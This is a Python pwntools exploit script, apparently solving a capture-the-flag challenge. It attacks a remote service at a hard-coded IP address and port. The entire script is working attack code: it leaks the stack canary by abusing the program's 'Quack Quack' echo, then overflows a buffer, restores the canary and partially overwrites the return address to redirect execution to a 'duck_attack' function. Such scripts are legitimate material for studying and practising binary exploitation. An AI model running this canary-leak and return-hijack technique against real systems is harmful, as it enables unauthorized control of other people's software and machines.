#!/usr/bin/env python3
from pwn import *

# Context settings for pwntools
context(os='linux', arch='amd64', log_level='info')

# Remote service address
HOST = "83.136.252.13"
PORT = 32838

# Addresses from the binary (no PIE)
DUCK_ATTACK = 0x40137f

# Offsets
PREFIX = b"Quack Quack "                # substring used by the program
LEAK_PAD = 0x65 - len(PREFIX)            # pad length to align to canary leak
BUF2_CANARY_OFF = 0x58                  # offset of canary in second buffer


def exploit():
    # Connect to remote
    r = remote(HOST, PORT)

    # === Stage 1: Leak the stack canary ===
    # Send payload to trigger strstr and leak bytes following our prefix
    r.sendlineafter(b'> ', b'A' * LEAK_PAD + PREFIX)
    # Receive until our prefix
    r.recvuntil(PREFIX)
    # Read the next 7 bytes (omit the leading NULL byte of the canary)
    leaked = r.recv(7)
    canary = u64(leaked.rjust(8, b'\x00'))
    log.success(f"Leaked canary: {hex(canary)}")

    # === Stage 2: Craft overflow to call duck_attack ===
    # Build second-stage payload
    payload2 = b'B' * BUF2_CANARY_OFF        # padding up to the canary
    payload2 += p64(canary)                 # restore the canary
    payload2 += b'C' * 8                    # overwrite saved RBP (dummy)
    # Overwrite only the lower 2 bytes of return address to jump to duck_attack
    payload2 += p64(DUCK_ATTACK)[:2]

    # Send the overflow payload
    r.send(payload2)

    # Switch to interactive mode to receive the flag
    r.interactive()


if __name__ == '__main__':
    exploit()
